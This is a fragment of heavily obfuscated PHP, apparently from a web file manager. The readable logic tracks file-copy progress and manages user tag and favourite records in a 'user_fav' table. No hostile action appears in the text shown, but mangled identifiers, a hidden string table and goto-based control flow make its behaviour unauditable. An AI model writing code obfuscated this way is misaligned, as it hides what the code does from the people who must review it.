$_SERVER[Ö‘Øù]; $A‘¹íò¤»ô =& $this->task; if (!$A‘¹íò¤»ô[$d •„ìöâ[1056]] || !$A‘¹íò¤»ô[$d •„ìöâ[756]]) { return; } if ($A‘¹íò¤»ô[$d •„ìöâ[1651]] == $d •„ìöâ[1128]) { $D‡ÓÈ®¨ï = $A‘¹íò¤»ô[$d •„ìöâ[1608]]; if ($A‘¹íò¤»ô[$d •„ìöâ[1609]] != $d •„ìöâ[1128]) { $D‡ÓÈ®¨ï = 0; } $FÑ–Ïá¥† = ($A‘¹íò¤»ô[$d •„ìöâ[1612]] + $D‡ÓÈ®¨ï) / $A‘¹íò¤»ô[$d •„ìöâ[756]]; $A‘¹íò¤»ô[$d •„ìöâ[1562]] = $FÑ–Ïá¥† * 0.3; } else { if ($A‘¹íò¤»ô[$d •„ìöâ[1651]] == $d •„ìöâ[311]) { $FÑ–Ïá¥† = $A‘¹íò¤»ô[$d •„ìöâ[1070]] / $A‘¹íò¤»ô[$d •„ìöâ[1056]]; $A‘¹íò¤»ô[$d •„ìöâ[1562]] = 0.3 + $FÑ–Ïá¥† * 0.5; } else { if ($A‘¹íò¤»ô[$d •„ìöâ[1651]] == $d •„ìöâ[107]) { $FÑ–Ïá¥† = 0; if ($A‘¹íò¤»ô[$d •„ìöâ[1607]]) { $FÑ–Ïá¥† = $A‘¹íò¤»ô[$d •„ìöâ[1608]] / $A‘¹íò¤»ô[$d •„ìöâ[1607]]; } $A‘¹íò¤»ô[$d •„ìöâ[1562]] = 0.3 + 0.5 + $FÑ–Ïá¥† * 0.2; } } } if ($A‘¹íò¤»ô[$d •„ìöâ[1562]] > 0) { $C¼ñê…˜Ç = timeFloat() - $A‘¹íò¤»ô[$d •„ìöâ[782]] - $A‘¹íò¤»ô[$d •„ìöâ[1565]]; $A‘¹íò¤»ô[$d •„ìöâ[1566]] = $C¼ñê…˜Ç * (1 - $A‘¹íò¤»ô[$d •„ìöâ[1562]]) / $A‘¹íò¤»ô[$d •„ìöâ[1562]]; } } public function copyFileStart($f ¥ƒĞ’è, $dÂÉšˆÕÖ£, $E‡Äùğ¨¶Ş, $FµğÖàŒãŸ, $AæÄµ†™Âì, $dô‚™œ­×) { $eïÛÜ¼Ï¬Ó =& $_SERVER[Ö‘Øù]; parent::copyFileStart($f ¥ƒĞ’è, $dÂÉšˆÕÖ£, $E‡Äùğ¨¶Ş, $FµğÖàŒãŸ, $AæÄµ†™Âì, $dô‚™œ­×); $cîÔ£Îªñ =& $this->task; if ($cîÔ£Îªñ[$eïÛÜ¼Ï¬Ó[1651]] == $eïÛÜ¼Ï¬Ó[311]) { $cîÔ£Îªñ[$eïÛÜ¼Ï¬Ó[1651]] = $eïÛÜ¼Ï¬Ó[107]; } $this->update(); } public function copyFileEnd($c’‘‡àÃœœ, $d÷½ñŠóçÑ, $f½®Å…Ú˜, $DâÆ¨²¯ÙÇ, $e½øÜ†«, $E‘ÉÛ‚­) { $C•÷¦è»ó‰ =& $_SERVER[Ö‘Øù]; $a‡¬Ø¦¢õ» =& $this->task; $a‡¬Ø¦¢õ»[$C•÷¦è»ó‰[1608]] = $a‡¬Ø¦¢õ»[$C•÷¦è»ó‰[1607]]; $a‡¬Ø¦¢õ»[$C•÷¦è»ó‰[1612]] += $a‡¬Ø¦¢õ»[$C•÷¦è»ó‰[1607]]; $a‡¬Ø¦¢õ»[$C•÷¦è»ó‰[1609]] = $C•÷¦è»ó‰[33]; $this->update(); } public function nameParse($fÓîé±¸ê¼) { $aĞ‡ìÌÉƒ =& $_SERVER[Ö‘Øù]; $aî×ÛãÀ‚ç =& $this->task; if ($aî×ÛãÀ‚ç[$aĞ‡ìÌÉƒ[1070]] < $aî×ÛãÀ‚ç[$aĞ‡ìÌÉƒ[1056]]) { $b¾á´“­¹š = get_path_this($fÓîé±¸ê¼); if (strstr($b¾á´“­¹š, $aĞ‡ìÌÉƒ[95])) { $aî×ÛãÀ‚ç[$aĞ‡ìÌÉƒ[1070]] += 1; } } if ($aî×ÛãÀ‚ç[$aĞ‡ìÌÉƒ[1651]] == $aĞ‡ìÌÉƒ[1128]) { $aî×ÛãÀ‚ç[$aĞ‡ìÌÉƒ[1651]] = $aĞ‡ìÌÉƒ[311]; } $aî×ÛãÀ‚ç[$aĞ‡ìÌÉƒ[1605]] = $fÓîé±¸ê¼; $this->update(); } } goto CÛÃØ†‹ò; cà§÷ßµÉ¿: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($EÈ‘ºâŒ‚´) { $f²ò‰š“•ö =& $_SERVER[Ö‘Øù]; return array($f²ò‰š“•ö[1837] => array(USER_ID, $f²ò‰š“•ö[1838])); } protected function listData() { $cìíÁ¶¹…¶ =& $_SERVER[Ö‘Øù]; $B½÷ÖŞ¢ğ = array($cìíÁ¶¹…¶[1552] => USER_ID, $cìíÁ¶¹…¶[478] => array($cìíÁ¶¹…¶[1841], 0)); $C®­£Í£Õâ = $cìíÁ¶¹…¶[1843]; $DˆÖ¸»³½ = $this->field($C®­£Í£Õâ)->where($B½÷ÖŞ¢ğ)->order($cìíÁ¶¹…¶[1844])->select(); return $DˆÖ¸»³½ ? $DˆÖ¸»³½ : array(); } protected function listByTag($d¹¶çì­ó£) { } protected function addToTag($AˆåÌÉ„Ÿ, $AŠÈ“ĞÜÓµ) { $AØ‰»ˆÈíÊ =& $_SERVER[Ö‘Øù]; if (!Model($AØ‰»ˆÈíÊ[1977])->listData($AŠÈ“ĞÜÓµ) || !Model($AØ‰»ˆÈíÊ[825])->pathInfo($AˆåÌÉ„Ÿ)) { return !1; } $aÄŠßœÉ‰î = array($AØ‰»ˆÈíÊ[1552] => USER_ID, $AØ‰»ˆÈíÊ[478] => $AŠÈ“ĞÜÓµ, $AØ‰»ˆÈíÊ[416] => $AˆåÌÉ„Ÿ, $AØ‰»ˆÈíÊ[417] => $AØ‰»ˆÈíÊ[411], $AØ‰»ˆÈíÊ[415] => $AØ‰»ˆÈíÊ[33], $AØ‰»ˆÈíÊ[1734] => 0); if ($this->where($aÄŠßœÉ‰î)->find()) { return !1; } return $this->add($aÄŠßœÉ‰î); } protected function removeFromTag($B”’ÆŒ’‡Û, $c›’¦Óë‰) { $f†÷ÅğÆ¢ =& $_SERVER[Ö‘Øù]; if (!Model($f†÷ÅğÆ¢[1977])->listData($c›’¦Óë‰)) { return !1; } if (is_array($B”’ÆŒ’‡Û)) { $B”’ÆŒ’‡Û = array($f†÷ÅğÆ¢[7], $B”’ÆŒ’‡Û); } $C˜£ËŸÎáÀ = array($f†÷ÅğÆ¢[1552] => USER_ID, $f†÷ÅğÆ¢[478] => $c›’¦Óë‰, $f†÷ÅğÆ¢[417] => $f†÷ÅğÆ¢[411], $f†÷ÅğÆ¢[416] => $B”’ÆŒ’‡Û); return $this->where($C˜£ËŸÎáÀ)->delete(); } protected function removeByTag($E†ƒ›ë‹Şò) { $a•²È–‚²’ =& $_SERVER[Ö‘Øù]; if (!$E†ƒ›ë‹Şò) { return !1; } $AÕ–ê‰¨Õá = array($a•²È–‚²’[1552] => USER_ID, $a•²È–‚²’[478] => $E†ƒ›ë‹Şò); return $this->where($AÕ–ê‰¨Õá)->delete(); } protected function removeBySource($e£Š…÷) { $E˜‡óì‘†í =& $_SERVER[Ö‘Øù]; if (is_array($e£Š…÷)) { $e£Š…÷ = array($E˜‡óì‘†í[7], $e£Š…÷); } $a÷ÎåøÃ¾ = array($E˜‡óì‘†í[1552] => USER_ID, $E˜‡óì‘†í[416] => $e£Š…÷, $E˜‡óì‘†í[478] => array($E˜‡óì‘†í[1007], 0)); return $this->where($a÷ÎåøÃ¾)->delete(); } }